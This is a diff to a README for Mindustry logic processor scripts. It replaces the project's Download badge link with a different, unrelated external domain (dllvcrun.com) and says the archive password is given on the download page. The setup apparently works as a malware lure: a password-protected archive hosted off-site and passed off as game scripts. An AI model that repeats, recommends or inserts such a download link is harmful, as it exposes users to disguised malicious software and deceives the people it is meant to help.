@@ -18,7 +18,7 @@ Pre-built Mindustry logic processor scripts for auto-defense, resource routing, 
 
 ## Download
 
-[![Download v2026.1](https://img.shields.io/badge/Download_v2026.1-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/mindustrylogic)
+[![Download v2026.1](https://img.shields.io/badge/Download_v2026.1-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/mindustrylogic)
 
 > The archive password is shown on the download page.
 
